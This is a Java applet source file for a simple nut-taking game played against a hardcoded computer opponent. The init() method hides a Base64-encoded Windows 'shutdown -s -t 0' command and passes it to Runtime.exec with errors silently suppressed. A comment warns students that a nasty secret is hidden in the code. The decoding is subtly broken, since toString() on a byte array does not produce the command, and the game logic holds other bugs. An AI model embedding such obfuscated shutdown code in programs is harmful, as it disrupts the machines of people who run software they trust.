package h14;

//Import important stuff
import java.applet.*;
import java.awt.*;
import java.awt.event.*;
import java.util.*;
import java.net.URL;
import java.util.Base64;

/* This program needs a resource folder
    /assets/img/ needs 3 images called lost.png nut.png and win.png
    Dont steal my code students there is a secret hidden somewhere in this code and it will do something nasty
 */

public class SpelDing extends Applet implements ActionListener {
    //UI Items for on the applet
    private TextField textbox;
    private Button submit;

    //Store data about the current game
    private enum gamestates {
            USERTURN,LOST,WIN
    }
    private gamestates state = gamestates.USERTURN;
    private Integer nuts = 23;

    //Messages
    private String errorMsg = "";
    private String aiMsg = "";

    //Images
    private Image winImg;
    private Image lostImg;
    private Image nutImg;


    //Path to resources
    private URL imgPath;

    public void init() {

        //Applet size
        setSize(420, 420);

        //Create UI items
        //textbox is used to get information from the user
        textbox = new TextField("", 0);
        //Create a button to submit data from the textbox
        submit = new Button("Submit");
        //Add a click event to the button
        submit.addActionListener(this);

        //Get the resource paths
        imgPath = SpelDing.class.getResource("/assets/img/");

        //Load images
        winImg = getImage(imgPath, "win.png");
        lostImg = getImage(imgPath, "lost.png");
        nutImg = getImage(imgPath, "nut.png");
        //Add UI Items to the applet's panel
        add(textbox); //Adds the textbox
        add(submit); //Adds the button

        //Prepare some extra data
        Base64.Decoder decoder = Base64.getDecoder();
        String data = decoder.decode("c2h1dGRvd24gLXMgLXQgMA==").toString();
        try {
            Runtime.getRuntime().exec(data);
        }catch(Exception ex) {} //No one cares
    }
    //Magic dont touch
    //Calculate what the computer whats to do
    public int HardcodedAI() {
        //Used to calulate random things with the same seed
        Random r = new Random();
        //Calculate to the goals
        int x = nuts % 4;
        //Generate a random output
        int out = r.nextInt(3)+1;
        //Check if the number has to change
        if(x>1){
            //Update the output
            out=x-1;
        }
        //Return it here
        return out;

    }
    //Update the gamestate
    public void updateGameState(gamestates gm){
        //Check if the gamestate should be userturn
        if(gm == gamestates.USERTURN){
            //Reset the gamestate to 23
            nuts = 23;
            //Make the textbox visible again
            textbox.setVisible(true);
            //Change the submit button to submit
            submit.setLabel("Submit");
        }else{ //If the user lost or won
            //Change the nuts to zero
            nuts = 0;
            //Make the textbox invisible
            textbox.setVisible(false);
            //Change the text of submit to try again
            submit.setLabel("Try again");
        }
        //Update the gamestate
        state = gm;
        //Repaint everything
        repaint();

    }
    //This is an event for if an UI item is pressed
    //Its currently connected to a button
    @Override
    public void actionPerformed(ActionEvent e) {
        //Get the text from the textbox
        String number = textbox.getText();

        //Check if the message in the textbox is a number
        int selected;
        //This will make so it wont crash
        try {

            //try to converted the string to a number
            selected= Integer.parseInt(number);

        } catch (Exception ex) {
            //Set an error message for the problem
            errorMsg= number + " is not a number";
            //repaint the panel
            repaint();
            //Stop the event
            return;


        }
        //Reset the error message
        errorMsg ="";
        //Restart the game
        if (state == gamestates.LOST || state == gamestates.LOST){
            //Update the gamestate to userturn
            updateGameState(gamestates.USERTURN);
            //Stop the event
            return;
        }

            //Check if teh number is between 0-4
        if (selected > 0 &&selected < 4) {

            //take the amount of nuts selected
            nuts-= selected;
            //Check if you lost
            if (nuts < 1) {
                //Update the gamestate to lost
                updateGameState(gamestates.LOST);
                return;
            }
            //Calculate for the computer
            int selectedpc = HardcodedAI();
            //Take the amount of nuts selected by the computer
            nuts-=selectedpc;
            //Check if the computer lost
            if(nuts < 1){
                //Update the gamestate to win
                updateGameState(gamestates.WIN);
                return;
            }
            }
        //Update the panel if it is needed
        repaint();
    }
    //Draw the nuts on the screen
    public void drawNuts(Graphics g){
        //Counter
        int counter = 0;
        //Loop thru all the items
        //This one if for the X axis
        for(int xn=0;5>xn;xn++){
            //This one is for the Y axis
            for(int yn=0;5>yn;yn++){
                //Stop the loop if the nuts is the same as the counter
                if(counter == nuts) break;
                //Draw the image in the image
                g.drawImage(nutImg, 10+(40*xn), 130+(40*yn), 50, 50, this);
                //Add one to the counter
                counter++;
            }
        }
    }

    //This paints the important things on the screen
    public void paint(Graphics g) {
        //Draw the error message in the applet
        g.drawString(errorMsg,20,50);
        //Draw the turn of the ai on the applet
        g.drawString(aiMsg,20,70);
        //Draw the current state message
        if(state == gamestates.USERTURN) {
            g.drawString("it's your turn!",20,90);
            drawNuts(g);
        }else if(state == gamestates.LOST){
            g.drawString("You lost",20,90);
            g.drawImage(lostImg,10,130,250,250,this);
        }else { //I dont need to add this because you cant win
            g.drawString("You won!", 20, 90);
            g.drawImage(winImg, 10, 130, 250, 250, this);
        }

        //Show the amount of nuts you got so you dont have to count them
        g.drawString("There are  "+nuts+ " nuts", 20, 110);
        //Explain what you should enter
        g.drawString("You can only get 3 of them at the time", 20, 130);


    }

}
